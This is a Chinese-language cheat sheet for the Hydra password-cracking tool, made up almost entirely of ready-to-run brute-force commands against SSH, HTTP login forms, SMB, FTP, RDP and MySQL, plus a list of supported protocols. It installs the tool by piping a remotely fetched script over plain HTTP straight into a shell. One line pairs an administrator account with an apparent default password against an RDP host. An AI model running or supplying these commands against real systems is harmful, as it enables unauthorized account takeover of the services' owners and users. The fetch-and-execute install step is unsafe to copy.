# hydra

## 安装
    wget -q -O - http://www.atomicorp.com/installers/atomic | sh
    yum install hydra


## 破解ssh
    hydra -L user.txt -P pass.txt -v ssh://192.200.254.254:22345 -t 16


## http-post破解
    hydra -t 3 -L admin.txt -P passwd.txt 192.200.254.224 http-post-form "/login.php:user=^USER^&pass=^PASS^:登录失败" -o http.log
    http-post-form httppost方法提交表单
    user post字段
    pass post字段
    ^USER^ 固定格式字段
    ^PASS^ 固定格式字段


    登录失败 认证失败返回的html内容包含的信息  

## 破解smb
    hydra -L admin.txt -P passwd.txt 127.0.0.1 smb

## 破解ftp
    hydra -L admin.txt -P passwd.txt 127.0.0.1 ftp -vV


## 破解rdp
    hydra -L admin.txt -P passwd.txt 192.200.254.220 rdp -vV -o rdp.txt

## 破解 mysql
    hydra -L admin.txt -P passwd.txt mysql://127.0.0.1:3306
    hydra -l  administrator -p sangfor@2015  -t  10   rdp://192.200.254.201
    hydra -L  admin.txt  -P  passwd.txt  -t  10  smb://192.200.254.201


## 其他支持协议
- asterisk
- cisco
- cisco-enable
- cvs
- firebird
- ftp
- ftps
- http[s]-{head|get}
- http[s]-{get|post}-form
- http-proxy
- http-proxy-urlenum
- icq
- imap[s]
- irc
- ldap2[s] ldap3[-{cram|digest}md5][s]
- mssql
- mysql
- nntp
- oracle-listener oracle-sid
- pcanywhere
- pcnfs
- pop3[s]
- postgres
- rdp
- redis
- rexec
- rlogin
- rsh
- s7-300
- sip
- smb
- smtp[s] smtp-enum
- snmp
- socks5
- ssh
- sshkey
- svn
- teamspeak
- telnet[s]
- vmauthd
- vnc
- xmpp
